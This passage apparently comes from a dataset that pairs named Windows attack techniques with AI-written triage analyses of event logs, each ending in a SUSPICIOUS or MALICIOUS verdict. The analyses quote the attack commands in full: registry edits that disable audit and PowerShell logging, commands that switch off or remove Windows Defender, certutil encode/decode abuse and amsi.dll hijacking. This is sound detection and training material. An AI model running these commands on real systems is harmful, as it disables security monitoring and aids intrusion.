3. **Review and Validate User Activities**: Verify whether the `admin_test` account is part of scheduled administrative tasks and check for any anomalies or unauthorized login attempts.

4. **Monitor Network Traffic**: Analyze the network traffic from the affected host for any signs of data exfiltration or communication with known malicious IPs.

5. **Examine System Logs**: Expand the log review to include system, application, and additional security logs for timelines of the suspect processes and commands.

6. **Engage Digital Forensics**: If the suspicion remains after initial checks, involve digital forensic experts to perform an in-depth investigation into the system's activities and file integrity."
Disable Windows Command Line Auditing using reg.exe,"Based on the provided logs, here's a detailed analysis:

### Initial Observations

- **Security Log:** 
  - Events with ID 4616 (Time Change) involve the process `svchost.exe`. This could be a normal system operation, especially when changes are extremely close in time because of synchronization with time servers like `time.windows.com`, as indicated in the System log. This generally appears benign unless there's evidence of manipulated time which could obfuscate file timestamps.

- **Sysmon Logs:**
  - `wevtutil.exe` and `conhost.exe` processes are seen repeatedly executed by `SERVER002\admin_test` user. The use of `wevtutil.exe` can be typical for administrative tasks yet its repeated invocation could be suspicious depending on context, especially if it’s used to clear or modify event logs.
  - A sequence of events indicates the execution of `hostname.exe`, `whoami.exe`, and then registry modification via `cmd.exe` which changes a registry setting related to audit policies. The command used is:
    ```
    ""cmd.exe"" /c reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 0 /f
    ```
    This can be suspicious, particularly if it seems unwarranted as it affects audit policies. However, altering audit policies is common during certain maintenance or investigative processes.
  - Extensive Microsoft Edge update activity is recorded, which includes the execution of `MicrosoftEdgeUpdate.exe` in various modes (`/svc`, `/update`, etc.). Such activity can be regular if the software is set to update automatically.

### Anomalous/Suspicious Indicators

- The combination of `wevtutil.exe` and registry changes using `cmd.exe` could suggest attempts to cover tracks or alter logging behavior, which warrants closer inspection:

  - **`wevtutil.exe` Usage:** Evasive actions might include disabling or clearing event logs which is common in adversary tactics to avoid detection.
  - **Registry alteration command:** This command to modify policy affecting command line logging can be suspicious in an environment where such changes are tightly controlled and monitored.
  
- Microsoft Edge update processes are quite frequent, suggesting either a legitimate update cycle or potentially a misuse by a malicious script posing as an update process.

### Final Assessment

Given the above analysis, the activities described in the logs present certain behaviors that are:
- **Not obviously benign** due to the use of system tools in combination with registry changes affecting audit policies.
- **Require further investigation** to conclusively determine activity intent, especially whether the process executions and registry modifications align with legitimate administrative activity or scripted automation tasks.

### Resolution: SUSPICIOUS

**Guidance for Proceeding:**

1. **Investigate User Activity:** Verify if `admin_test` was engaged in legitimate administrative tasks or if their credentials might be compromised.
2. **Analyze Registry Changes:** Confirm if the registry modification was a sanctioned change by a known administrative action or deployment.
3. **Review `wevtutil` Invocations:** Ensure the usage of `wevtutil.exe` was for legitimate log management rather than manipulation or clearing.
4. **Edge Update Scrutiny:** Check if Edge updates align with official update timelines/releases from Microsoft to rule out potential misuse.

Further actions may involve looking into system backup logs or endpoint monitoring alerts that can corroborate or dispute the suspected activities observed."
Msiexec.exe - Execute Local MSI file with embedded JScript,"Upon reviewing the provided Sysmon and Application logs for Server002, there are several indicators of potential malicious activity:

### Analysis:

1. **Frequent Use of Wevtutil.exe**:
   - The Sysmon logs show repeated execution of `wevtutil.exe` (EventRecordIDs 17965, 17969, 17973, 17977, 17981) almost in tandem with `conhost.exe`. While `wevtutil.exe` is a legitimate Windows utility used to manage event logs, frequent or unexplained usage may indicate attempts to manipulate or clear event logs as part of anti-forensic efforts.

2. **Execution of Msiexec.exe from Temporary Directory**:
   - There is an instance of `cmd.exe` executing `msiexec.exe` with a silent installation flag (`/q`) for a JScript MSI file located in a temporary directory (EventRecordID 17991). The installation from a temporary directory, especially with a JScript component, is unusual. If this was not a planned deployment or update, it could indicate the execution of potentially unwanted software.

3. **Use of Privileged Tools and Scripts**:
   - The use of `whoami.exe` (EventRecordID 17987) and `hostname.exe` (EventRecordID 17983) can be part of script or tool execution to collect environment information, seen often in post-exploitation scenarios.

4. **Technical Context**:
   - There were no additional security logs provided, which could have given more context about logon events or access changes.
   - All suspicious executions were performed under the context of the user `SERVER002\\admin_test`, indicating actions were possibly performed using an account with administrative privileges.

5. **Application Logs**:
   - The application logs show events regarding the installation using `msiexec` (EventRecordIDs 2384 and 2385), consistent with the Sysmon logs. These entries correspond to the MSI event, confirming an installation process was performed but without further context on whether it was an approved or expected operation.

### Assessment:

Based on the provided logs, the repeated execution of `wevtutil.exe`, particularly its temporal proximity to potential script executions, the silent installation of a script component via MSI, and the combinations of observed behaviors are indicative of potentially unauthorized or malicious activities. 

### Resolution:

**SUSPICIOUS**

There is enough suspicious behavior to warrant further investigation, but not enough clear evidence to definitively label the activity as malicious without additional context (e.g., corroborative security logs, network traffic analysis, or insight into recent administrative activities on the system). 

### Guidance:

1. **Immediate Steps**: 
   - Perform a comprehensive review of server access logs and any associated accounts (especially `admin_test`).
   - Verify whether any authorized administrative activities align with the timestamps of the events noted.

2. **Forensic Analysis**:
   - Analyze the MSI file (`data.007_JScript.msi`) for its contents and properties.
   - Examine network logs for suspicious C2 communications or data exfiltration attempts.

3. **Monitoring and Response**:
   - Increase monitoring on the server for further suspicious activities.
   - If the analysis reveals malicious content, immediately isolate the system and conduct a full incident response.

Proceed with a deeper analysis while ensuring all necessary security protocols are activated to protect sensitive company assets."
Phantom Dll Hijacking - WinAppXRT.dll,"### Analysis of Windows Event Logs

**Key Observations:**

- **Microsoft Edge Update:** Several events logged show the `MicrosoftEdgeUpdate.exe` process executing with various command-line arguments. Typically, updating or checking for updates for Microsoft Edge is benign. However, anything involving temporary paths or unusual command-line arguments could warrant further inspection.

- **Command Execution:**
  - The `cmd.exe` process executed a suspicious command line:
    ```
    ""cmd.exe"" /c copy %%windir%%\System32\amsi.dll %%APPDATA%%\amsi.dll & ren %%APPDATA%%\amsi.dll WinAppXRT.dll & copy %%APPDATA%%\WinAppXRT.dll %%windir%%\System32\WinAppXRT.dll & reg add ""HKEY_CURRENT_USER\Environment"" /v APPX_PROCESS /t REG_EXPAND_SZ /d ""1"" /f
    ```
    This command sequence is attempting to replace the `amsi.dll` file, which is integral to the Antimalware Scan Interface, with a file renamed as `WinAppXRT.dll` and changing the Windows Registry to manipulate environment settings. This action is typical of an attempt to disable or bypass the Windows Defender or another antivirus solution, indicating highly suspicious or malicious behavior.

- **Registry Modification:** A registry key addition under `HKEY_CURRENT_USER\Environment` is present, which might represent an attempt to alter the behavior or configuration of the environment variables, often used in malicious escalation attempts.

- **`whoami.exe` and `wevtutil.exe` Execution Multiple Times:** These tools are commonly used for querying system information and managing event logs, respectively. Their execution could be part of typical user activity or a sign of malicious enumeration or log deletion.

### Conclusion

**Resolution: MALICIOUS**

Based on the observed events—particularly the command sequence replacing `amsi.dll` and registry modifications—there is strong evidence of malicious activity. These actions indicate an attempt to manipulate system files critical for system security and modify registry settings, which often suggest an intent to conduct further unauthorized, potentially harmful operations.

InstallHelper method call,"Based on the Windows event logs provided, here is a detailed analysis of the captured events:

### Analysis:

1. **PowerShell Activity:**
   - The logs contain events where `powershell.exe` was executed with a command that involves a suspicious script (`InstallUtilTestHarness.ps1`). This script involves the function `Invoke-BuildAndInvokeInstallUtilAssembly` and appears to deal with loading or executing `.dll` files. The command line suggests execution of a potentially malicious PowerShell script intended to test or install/utilize the assembly in the local temp directory. This would typically be executed under administrative context due to the capabilities it is trying to leverage.

2. **Involvement of .NET Assemblies:**
   - The events indicate compilation activities of .NET assemblies such as `csharp.exe` and `cvtres.exe` being heavily engaged during the process. Such events, especially under regular user operations, are unusual and suggest unauthorized code execution or payload delivery mechanisms involving .NET assemblies.

3. **High-Integrity Level Execution:**
   - The processes were running under high integrity levels, indicating that they had administrative privileges. This is indicative of potentially privileged operations that could modify system settings or access sensitive data.

4. **Indicators of Persistence Techniques:**
   - The use of `InstallUtil` is commonly associated with persistence mechanisms as malicious actors sometimes misuse it for invoking binaries instead of installing them through legitimate install paths. The logging activity related to testing its functionality hints at misuse rather than legitimate operations.

5. **Frequent Edge Update Executions:**
   - Multiple instances of `MicrosoftEdgeUpdate.exe` and related updater components are seen running. While Edge Updates can be a routine operation, the discrepancies in their typical execution sequences and arbitrary paths like those in temporary directories warrant further investigation to confirm authenticity against tampering or abuse by malicious payloads.

6. **Process Spawns and Parent-Child Relationships:**
   - `wevtutil.exe` and `conhost.exe` show unusual clusters of activity. The former is often used for manipulating event logs, and coupled with the patterns observed, it suggests potential log tampering attempts.

BlackByte Ransomware Registry Changes - Powershell,"### Analysis of the Logs:

**1. Sysmon logs:**
   - **Frequent Execution of `wevtutil.exe` and `conhost.exe`:** There are several instances of `wevtutil.exe` and `conhost.exe` being executed by the user `SERVER002\admin_test`. While `wevtutil.exe` is a legitimate tool that can be used to query and manipulate event logs, its frequent usage in quick succession could indicate attempts to clear or tamper with event logs. The presence of `conhost.exe` is expected as it often runs alongside console windows, but its repeated launch alongside `wevtutil.exe` might be noteworthy.
   - **PowerShell Execution:** The logs show a PowerShell instance executing commands that modify system registry settings. These include setting properties like `LocalAccountTokenFilterPolicy`, `EnableLinkedConnections`, and `LongPathsEnabled`. This command-line activity is suspicious due to the modification of system policies, which might be indicative of privilege escalation or persistence techniques.

**2. PowerShell logs:**
   - The PowerShell log entries confirm the execution of the commands seen in the Sysmon logs. The use of `New-ItemProperty` to modify registry keys related to security settings is a definite indicator of potentially unauthorized configuration changes being implemented, possibly with malicious intent.

**3. Security logs:**
   - No explicit security breaches are evident from the provided `Security` logs. However, these logs do show related time changes, but these are aligned with regular system activities and updates, possibly corresponding to the system time being updated by the Windows time service.

**4. System logs:**
   - Similar to the security logs, the `System` logs show time adjustments which correlate with NTP (Network Time Protocol) activities tied to svchost.exe, a standard system service process. These do not suggest anything malicious in isolation.

**5. Application logs:**
   - Basic activity related to the `Software Protection Platform Service` is being logged, indicating standard service operations.

### Assessment and Conclusion:

- **Suspicious Activity:** The consistent triggering of `wevtutil.exe` and the registry modifications via PowerShell by user `SERVER002\admin_test` are notably suspicious. This is especially true when such alterations involve security-related policies, potentially aiming to alter user privileges or connections. These actions may align with typical tactics used in lateral movement or privilege escalation.

- **Resolution: SUSPICIOUS:** The logs contain behaviors that warrant further investigation, particularly concerning the registry changes and the high frequency of component launches that could link to log tampering or system modifications without appropriate authorizations. Additionally, correlating user activity on `Server002` around these timestamps may reveal more about the intent and legitimacy of these operations.

### Recommendations:

1. **Immediate Action:**
   - Conduct a deeper investigation into the account `SERVER002\admin_test` to verify recent login or access patterns and corroborate these actions with legitimate user activities.
   - Review the system for any unauthorized changes to critical security settings and roll them back or secure them if necessary.

2. **Ongoing Monitoring:**
   - Implement enhanced alerting mechanisms for unexpected or frequent use of `wevtutil.exe` and similar commands.
   - Utilize security tools to monitor real-time registry changes and policy modifications, particularly those affecting user privileges and connections."
Disable Windows Defender with DISM,"### Detailed Analysis of the Logs:

#### Suspicious or Anomalous Behavior:

1. **Wevtutil.exe Execution**:
   - There were multiple executions of `C:\Windows\System32\wevtutil.exe` by the user `SERVER002\admin_test`. Wevtutil is a command-line utility used to retrieve information about event logs and publishers. While its usage might be legitimate for system maintenance or log management, repeated execution could be a concern if it's an unusual activity for the user, especially on a CEO's machine.

2. **Disabling Windows Defender**:
   - The command executed by `cmd.exe`: `""cmd.exe"" /c Dism /online /Disable-Feature /FeatureName:Windows-Defender /Remove /NoRestart /quiet` is highly concerning. It is designed to disable and remove Windows Defender, which is a built-in security feature. This action is typically associated with malicious intent, such as attempting to disable security mechanisms to avoid detection.

3. **Time Anomalies**:
   - There are time discrepancies in the system and security logs, where the system time was adjusted (from a future timestamp to an earlier one). This manipulation is captured by Event IDs 4616 in the Security log and 1 in the Kernel-General logs. Time changes can be indicative of an attempt to evade detection or logging by creating gaps in log continuity.

#### Potential Malicious Activity or Compromise:

1. **Disabling Security Features**:
   - The action of disabling Windows Defender using DISM is considered malicious unless explicitly sanctioned for troubleshooting by IT personnel. This is a strong indicator of potential compromise.

2. **Repeated Use of Log Query Utility**:
   - The repetitive execution of `wevtutil.exe` could indicate attempts to access or manipulate logs, which is suspicious when combined with other abnormal activities.

3. **Privilege Escalation or Use of Elevated Privileges**:
   - The listed privileges in event ID 4672 (SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, etc.) indicate that the user `admin_test` had special privileged rights, potentially allowing it to disable security features. This level of privilege should be closely monitored to ensure it is justified and not abused.

### Assessment and Resolution:

- Based on the analysis, there is a strong indication of **MALICIOUS** activity, primarily focusing on the disabling of Windows Defender and time manipulation, which are red flags in security monitoring.
  
### Recommendations and Guidance:

1. **Immediate Investigation and Response**:
   - Investigate the machine for additional signs of compromise, particularly focusing on any unauthorized access or data exfiltration.
   - Inspect the timeline and context of `admin_test` sessions for any irregularities.

2. **Security Software and Configuration Review**:
   - Reinstate Windows Defender or equivalent security protections.
   - Review and enforce security policies to prevent the disabling of security features.

3. **Access Controls and User Permissions**:
   - Re-evaluate user privileges to ensure least privilege is practiced and consider revoking any unnecessary high-level access.
   - Implement monitoring alerts for changes to system time and security configurations.

4. **Forensic Analysis**:
   - A deeper forensic analysis of `SERVER002` should be conducted to identify any unauthorized modifications or rootkit installations.

Communicate with the IT department to ensure that any configuration changes undergo a formal review process, and continue monitoring for potential lateral movement within the network."
Dynamic C# Compile,"## Detailed Analysis

### Suspicious or Anomalous Behavior
1. **PowerShell Invocation**: The logs indicate several instances of PowerShell being used with the command `Invoke-Expression`, specifically attempting to execute a file named `data.004_DynamicCompile.exe` located in a temporary directory (C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.004\bin\). The use of `Invoke-Expression` to run a binary from a temporary path is highly suspicious because it aligns with common malware behavior, particularly PowerShell-based obfuscated scripts or loaders.

2. **Use of `wevtutil.exe`**: There are multiple instances of `wevtutil.exe` being executed. This utility is used to manage event logs and its repeated execution might indicate log tampering or clearing by a malicious actor attempting to cover tracks.

3. **Conhost Executions**: Numerous `conhost.exe` processes are spawned in conjunction with `powershell.exe`. While `conhost.exe` often appears when command-line applications are run, its association with other suspicious activities (like the PowerShell invocation mentioned) can indicate a running script or malware.

4. **Execution of Non-Standard Executable**: The presence of the executable `data.004_DynamicCompile.exe` being run in the context of a PowerShell script is highly suspicious as it is not immediately recognizable as a legitimate Windows or application-related process.

### Malicious Activity Indicators
- **PowerShell with Obfuscated/Encoded Commands**: `powershell.exe` executed with `Invoke-Expression` and loading potentially malicious executables from a non-standard directory.
- **Execution of Unknown Executable**: An unknown executable `data.004_DynamicCompile.exe` being run without any context of being a legitimate application suggests compromise.

### Threats or Risks Identified
- Potential for **Remote Code Execution**: The activity of executing executables from temporary paths can indicate the presence of potentially harmful scripts possibly leading to system compromise.
- **Privilege Escalation and Persistence**: The malicious script may be attempting to elevate privileges or establish persistence on the system.
- **Data Exfiltration or Destruction**: If the external executable has capabilities for network communication or system-level changes, there’s a risk of data exfiltration or destructive behavior.

### Further Actions and Guidance
- **Immediate Quarantine**: Isolate the affected system from the network to prevent further spread or exfiltration of data.
- **File Inspection**: Conduct a detailed forensic analysis of `data.004_DynamicCompile.exe` and associated suspicious scripts or files.
- **Monitor and Review Logs**: Review more logs for evidence of further intrusion, and monitor network traffic for anomalous connections particularly from this host.
- **Security Patch Assessment**: Ensure the system is up-to-date with all security patches to mitigate exploitation.
- **User Training and Awareness**: Reinforce security training focused on suspicious file activity and safe computing practices.

## Resolution
**MALICIOUS** - The logs show signs of potentially malicious activity, especially around the misuse of PowerShell and execution of potentially unwanted binaries from non-standard directories. Immediate steps should be taken to address the possibility of a security breach."
Certutil Rename and Decode,"### Detailed Analysis of the Logs

Upon review of the provided Windows event logs, several activities were identified as requiring further scrutiny due to their potentially suspicious nature.

#### 1. Process Execution and Command-line Arguments:
- **Execution of CertUtil**: There is an event where `cmd.exe` was executed with a command-line that copied `certutil.exe` to a temporary location and used it to encode and decode `calc.exe`. CertUtil is often used by attackers for malicious purposes such as data encoding, exfiltration, or living-off-the-land techniques.
  - Command execution: 
    ```
    cmd.exe /c copy %%windir%%\\system32\\certutil.exe %%temp%%\\tcm.tmp & %%temp%%\\tcm.tmp -encode C:\\Windows\\System32\\calc.exe %%temp%%\\data_calc2.txt & %%temp%%\\tcm.tmp -decode %%temp%%\\data_calc2.txt %%temp%%\\data_calc2_decoded.exe
    ```
  - This behavior is consistent with attempts to use built-in tools to obfuscate or manipulate files, which is often a hallmark of malicious activity.

#### 2. Privilege and Logon Events:
- **Privilege Assignment (Event ID 4672)**: A system process was granted a wide array of privileges including `SeDebugPrivilege` and `SeTcbPrivilege`, which are sensitive and typically reserved for critical system functions. While this on its own is not necessarily indicative of malicious behavior, it combines ominously with the suspicious use of `certutil.exe`.

#### 3. Sysmon Events:
- **Frequent Usage of Sysmon**: There were multiple processes launched around the same time linked to administrative users, including the use of `whoami.exe`, `hostname.exe`, and `cmd.exe`. The latter with peculiar commands, again raises flags regarding potential reconnaissance or lateral movement attempts.

### Assessment

Considering the identified suspicious activity, particularly the unusual use of `certutil.exe` and associated command-line expressions in conjunction with elevated privileges detected in the logs, there is a strong basis for suspecting malicious activity. 

### Guidance and Resolution

1. **Conduct Further Investigation**: 
   - **Network and Endpoint Analysis**: Examine network logs to detect potential data exfiltration and check if the encoded files were potentially transferred out of the system.
   - **Endpoint Security Assessment**: Use endpoint detection and response (EDR) tools to inspect further any processes or users related to this anomaly.
   - **Review Administrative Users**: Verify if there were unauthorized changes to administrative accounts and if any credential misuse occurred.
   - **Analyze Other Systems**: Check if similar signatures and behaviors are present on other critical systems, particularly those with important roles such as the CEO's machine.

2. **Strengthen Security Measures**: 
   - Consider enhancing existing controls to monitor the use of tools like `certutil.exe` and privilege escalation during user operations.
   - Implement stricter controls and alerts for suspicious command-line usage patterns that reflect encoding/decoding or data manipulation activities.

Based on the comprehensive review, the conclusion for the logs is:

**Resolution: MALICIOUS**"
Windows Powershell Logging Disabled,"Upon analyzing the provided event logs, there are some observations that stand out:

1. **Registry Modification via Command Line**:
   - The logs show a `cmd.exe` command that modifies Windows PowerShell logging policies by adding registry entries to disable ModuleLogging, ScriptBlockLogging, and Transcription logging. This is performed using a `cmd.exe` process, executed by the user `SERVER002\\admin_test`, and primarily leveraging `reg.exe` tool for setting registry entries.
   - The command used is: `""cmd.exe"" /c reg  add HKCU\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging /v EnableModuleLogging /t REG_DWORD /d 0 /f...`.

2. **Time Change Events**:
   - Time-related events (ID 4616 and Kernel-General Event ID 1) indicate that there were changes to the system time. This could suggest an attempt to potentially mislead log timestamps or to synchronize activities, although the exact purpose cannot be confirmed without more context.

3. **Use of Built-in Utilities with High Privileges**:
   - There are multiple instances of processes like `wevtutil.exe`, `conhost.exe`, and `whoami.exe` running under the high integrity level by the user `SERVER002\\admin_test`. These utilities, on their own, may be benign but can be leveraged for malicious activities if not typically used by non-system admin users.

4. **Microsoft Edge Update Activity**:
   - A significant number of events relate to Microsoft Edge and its update mechanism. This currently does not raise alarms as it appears to be a legitimate update process. It is typical for organization-approved software to update itself.

### Assessment:
The registry modifications to disable PowerShell logging are particularly concerning. Disabling such logging capabilities is a tactic often used by attackers to cover their tracks, especially when intending to execute or having executed a payload through PowerShell.

The sequence of events suggests the user `SERVER002\\admin_test` was either running scripts or applications that temporarily disabled logging. Given that:
- Disabling PowerShell logging capabilities without a valid reason is suspicious and could potentially aid in concealing malicious activity.
- The log entries primarily concern registry edits that reduce transparency over PowerShell activities. 

### Conclusion:
Based on the evidence of registry tampering aimed at disabling security features, the conclusion is:

**Resolution: MALICIOUS**

### Guidance on How to Proceed:
1. **Immediate Mitigation**: 
   - Re-enable powerShell logging policies to their default settings to ensure comprehensive auditing in PowerShell.
   - Conduct a thorough check for any unauthorized changes or malicious scripts that may have been executed on the system.

2. **User Investigation**:
   - Investigate the actions of the user `admin_test` on` SERVER002`, seeking to understand the necessity and authorization behind these modifications.

3. **Network Monitoring**:
   - Monitor the network for any unusual outgoing traffic from the system that could indicate data exfiltration.

4. **Further Forensic Analysis**:
   - Conduct deeper forensic analysis on the system to track any suspicious files or indicators of compromise linked to potential malware or unauthorized scripts. 

5. **Employee Training and Awareness**:
   - Reinforce training around acceptable use policies and educate on detecting and reporting suspicious activities."
Tamper with Windows Defender Registry,"### Detailed Analysis of the Logs:

**1. Suspicious PowerShell Activity:**
   - **Event Details:** There are multiple Sysmon and PowerShell logs indicating the execution of a PowerShell command that modifies Windows Defender settings.
   - **PowerShell Command:** `powershell.exe & {Set-ItemProperty ""HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"" -Name DisableAntiSpyware -Value 1}`
   - **Analysis:** This command is designed to disable Windows Defender's antispyware capabilities. The execution of such a command, especially under the context of the `admin_test` user and with high integrity, is highly suspicious and indicative of an attempt to weaken the system's security posture potentially for malicious purposes.

**2. Frequent Wevtutil and Conhost Executions:**
   - **Event Details:** Multiple entries show the execution of `wevtutil.exe` and `conhost.exe` processes in rapid succession by the user `SERVER002\admin_test`.
   - **Analysis:** While Wevtutil (Windows Event Utilities) is a legitimate Windows tool commonly used for managing event logs, frequent executions without clear justification or context may suggest tampering with system logs or an attempt to cover tracks of unauthorized activities.

**3. Edge Update Processes:**
   - **Event Details:** Numerous entries related to `MicrosoftEdgeUpdate.exe` processes.
   - **Analysis:** These logs indicate standard processes related to the update mechanism for Microsoft Edge. Despite their high volume, they don't immediately indicate malicious behavior without additional context suggesting an anomaly or abuse.

**4. SPP Service Log Entry:**
   - **Event Details:** Logs related to `Microsoft-Windows-Security-SPP` (Software Protection Platform).
   - **Analysis:** This entry appears to be a normal log entry related to software protection or license validation and does not immediately suggest malicious activity.

### Assessment:

- **Threats and Risks Identified:**
  - The use of PowerShell to disable Windows Defender is the most concerning and likely indicative of an ongoing or impending compromise. Disabling security features is a common step taken by attackers to facilitate further malicious activity without interference from security tools.
  - Numerous legitimate process executions (such as EdgeUpdate) suggest possible automated tasks related to software updates, but these do not immediately pose a threat without further indicators.

### Guidance on How to Proceed:

1. **Immediate Actions:**
   - Investigate the source and reason behind the PowerShell command disabling Windows Defender. Determine if this was initiated by an authorized user or if credentials might have been compromised.
   - Check for any signs of unauthorized access or tampering with security settings.
   - Reactivate any disabled security features, such as Windows Defender, to ensure the system is protected.

2. **Further Investigations:**
   - Review user activity logs for `SERVER002\admin_test` to determine if there are patterns or additional commands executed that align with known malicious techniques.
   - Analyze other endpoints on the network for similar activities to assess if this action is isolated or part of a broader compromise.

3. **Preventative Measures:**
   - Enhance monitoring around critical systems and high-privilege accounts, setting up alerts for potential security setting modifications.
   - Implement stricter access controls and consider auditing PowerShell script executions across the network.

### Final Resolution: 

**MALICIOUS** - The execution of a PowerShell command to disable Windows Defender's antispyware capability is indicative of malicious intent aimed at reducing the system's defenses, potentially paving the way for further unauthorized or harmful actions."
UEFI Persistence via Wpbbin.exe File Creation,"### Analysis

Upon analyzing the given event logs from the Windows host, several observations can be made:

1. **Repeated Commands**:
   - A series of basic Windows commands such as `hostname.exe` and `whoami.exe` are being executed by the user `SERVER002\admin_test`. These commands are typical for system information gathering but their repeated and consistent execution can sometimes be indicative of automated tasks or scripts, especially if not part of the user's ordinary activity profile.
   
2. **PowerShell Activity**:
   - There is evidence of a suspicious PowerShell command being executed: `powershell.exe & {echo \""Creating %systemroot%\wpbbin.exe\"" , New-Item -ItemType File -Path \""$env:SystemRoot\System32\wpbbin.exe\""}`. This command is attempting to create a binary file named `wpbbin.exe` in the `System32` directory, which is highly unusual and suspicious. The use of environment variables and creation of executables in critical system paths is often associated with malicious activity.

3. **Use of `wevtutil.exe`**:
   - The `wevtutil.exe` utility, which is used for managing event logs, has been executed multiple times. While this might be for benign administrative or system maintenance purposes, it could also indicate attempts to query or modify event logs to cover tracks.

4. **Time Stomping**:
   - There are changes in the system time recorded in the logs (`EventID: 4616` from the Security log and `EventID: 1` from the System log), which may suggest an effort to alter timestamps and potentially obscure the timeline of events.

5. **Privilege Usage**:
   - An elevation or usage of a variety of high-impact privileges (`SeDebugPrivilege`, `SeTcbPrivilege`, etc.) logged in `EventID: 4672` suggests elevated rights were exercised, which can be benign in administrative tasks but might be exploited in unauthorized privilege escalation attacks.

### Assessment

The combination of executing a suspicious PowerShell command to create an executable in `System32`, the frequent use of `wevtutil.exe`, and the alteration of system time are strong indicators of nefarious activity. The use of administrative privileges in conjunction with these activities suggests a potential compromise or step in a larger attack sequence.

### Resolution

**MALICIOUS** - The behavior observed in the logs is indicative of potentially malicious activity, especially given the PowerShell script designed to create an executable in a critical system directory and the alteration of system time settings which could be used to obfuscate a timeline of events, typical techniques used in attempts to maintain persistence or evade detection.

### Guidance

1. **Immediate Actions**:
   - Isolate the affected machine from the network to prevent further potential lateral movement or data exfiltration.
   - Conduct a full endpoint security scan focusing particularly on recently modified areas such as the `System32` directory and registry changes.
   - Review and potentially reverse any unauthorized changes to system time settings.
   - Analyze network logs for any suspicious outbound communication from this host.

2. **Further Investigation**:
   - Examine the origin and content of `wpbbin.exe`, if present.
   - Identify any recent user or application activity that corresponds with the timeframe of the suspicious PowerShell command.
   - Assess user activity against routine behavior to identify if this is a deviation calling for deeper scrutiny into possible credential compromise.

3. **Preventative Measures**:
   - Reinforce PowerShell script execution policies and implement logging to capture suspicious command usages.
   - Monitor and restrict the use of administrative privileges.
   - Conduct awareness training for recognized techniques of lateral movement and privilege misuse. 

If further evidence is required, coordinate with legal and incident response teams to maintain evidence integrity for potential forensic analysis."
DLL Search Order Hijacking - amsi.dll,"Upon reviewing the provided event logs, several observations suggest a potential indicator of suspicious activity:

1. **PowerShell Execution:**
   - The logs reveal multiple instances of PowerShell being executed from `updater.exe` located in the `AppData\Roaming` directory. This is unusual as `AppData` is typically a location associated with user data storage rather than application execution. The specific command used: `C:\\Users\\admin_test\\AppData\\Roaming\\updater.exe -Command exit` suggests a potential attempt to execute a benign command while obscuring the tool's intent by using a generic name such as `updater.exe`.

2. **Command Prompt Command:**
   - There is a suspicious `cmd.exe` command logged: 
     ```
     ""cmd.exe"" /c copy %%windir%%\\System32\\windowspowershell\\v1.0\\powershell.exe %%APPDATA%%\\updater.exe & copy %%windir%%\\System32\\amsi.dll %%APPDATA%%\\amsi.dll & %%APPDATA%%\\updater.exe -Command exit
     ```
   - The intent here seems to be duplicating `powershell.exe` and `amsi.dll` (Antimalware Scan Interface DLL) to a new location and executing from there, potentially bypassing monitoring and scanning by repurposing legitimate binaries for unwanted interactions, indicating possible evasion techniques.

3. **Sysmon Logs:**
   - Sysmon logs indicate the execution of both `cmd.exe` and `updater.exe`, reinforcing the process execution chain traced in earlier events.

4. **Security and System Events:**
   - The Security Event logs and System logs show standard operations, such as time synchronization and Windows system services (e.g., `svchost.exe`), which aren't inherently suspicious but occur close to the time of the aforementioned actions, keeping them relevant in the timeline.

5. **Other Logs:**
   - Activities logged by some system services and updates like `MicrosoftEdgeUpdate` seem typical for system update checks and installations. This behavior isn't inherently suspicious unless tied to unauthorized actions. However, it doesn't seem connected to the suspicious PowerShell/command prompt activities from an initial glance.

### Assessment:
- The activity involving `updater.exe` in `AppData\Roaming`, particularly its replication and execution via PowerShell, coupled with the command to execute from a non-standard directory, strongly suggests usage patterns similar to those employed by malicious actors, often seen in fileless malware techniques or living-off-the-land binaries.

### Conclusion:
- The reviewed logs exhibit **SUSPICIOUS** behavior that warrants further investigation to understand the context and intent, verifying whether the `updater.exe` and related activities were legitimate administrative actions or attempts at compromise.

### Recommended Actions:
1. **Conduct a File Analysis:**
   - Analyze `updater.exe` for known malware signatures or anomalous characteristics.
2. **Audit System for Persistence Mechanisms:**
   - Check for unusual scheduled tasks, startup items, or registry edits that could indicate persistence.
3. **Network Traffic Inspection:**
   - Inspect network traffic logs for connections initiated by processes running from the `AppData` directory.
4. **User Awareness:**
   - Verify with the user (if possible) or IT administration whether they initiated these actions purposefully.
5. **Additional Monitoring:**
   - Intensify monitoring on the affected systems for similar indicators of compromise or deviation from standard operational procedures."
AMSI Bypass - Create AMSIEnable Reg Key,"Upon analyzing the provided Windows event logs, several indicators of potential malicious activity stand out. Here's the detailed analysis:

### Analysis of Indicative Logs:

1. **PowerShell Logs:**
   - There are entries indicating the disabling of AMSI (Antimalware Scan Interface) by setting the `AmsiEnable` registry key to `0` under `HKCU:\Software\Microsoft\Windows Script\Settings`.
   - The execution of PowerShell scripts that modify registry keys to disable AMSI is a known technique often employed by attackers to bypass security controls and allow malicious scripts to execute without being detected.

2. **Sysmon Logs:**
   - Observed execution of processes like `wevtutil.exe`, `conhost.exe`, and `whoami.exe` initiated by `SERVER002\admin_test`.
   - The frequent use of administrative and system-level access along with the process spawning pattern may indicate script-based or automated tasks attempting to survey the system or evade detection.
   - The execution of Edge Update processes under `NT AUTHORITY\SYSTEM` and `admin_test` users highlight routine system updates, which seem benign in the context of Microsoft Edge.

3. **Application Logs:**
   - The entries such as ""Service stopped"" related to `EdgeUpdate` could correlate to normal operational tasks and do not immediately suggest malicious behavior.

4. **Security Logs:**
   - Adjustments to system time recorded through `svchost.exe` with `LOCAL SERVICE` acting are usually normal, but when paired with suspicious PowerShell activity, they can indicate potential 'time stomping' attempts used for obscuring log trails.

5. **System Logs:**
   - The time change logs, again correlated with potential 'time stomping', might indicate attempts to manipulate forensic timelines.

### Assessment:

- The modification of AMSI settings through PowerShell scripts is a strong indicator of malicious intent as it directly affects system defenses. 
- Execution of several processes by a possibly elevated `admin_test` account adds to the suspicion, especially with activities aligning with process spawning patterns typically seen in reconnaissance or lateral movement phases of an attack.
- Overall, displacement or manipulation of time records, when analyzed with other suspicious script execution activities, suggests possible attempts to conceal activities or the presence of automated malicious actions.

### Recommendation and Overall Resolution:

- **Resolution: MALICIOUS**

The PowerShell log entries obfuscating AMSI functionality combined with the suspicious behavior of executed processes point towards a clear attempt at system compromise or circumvention of security controls. Immediate action is recommended:
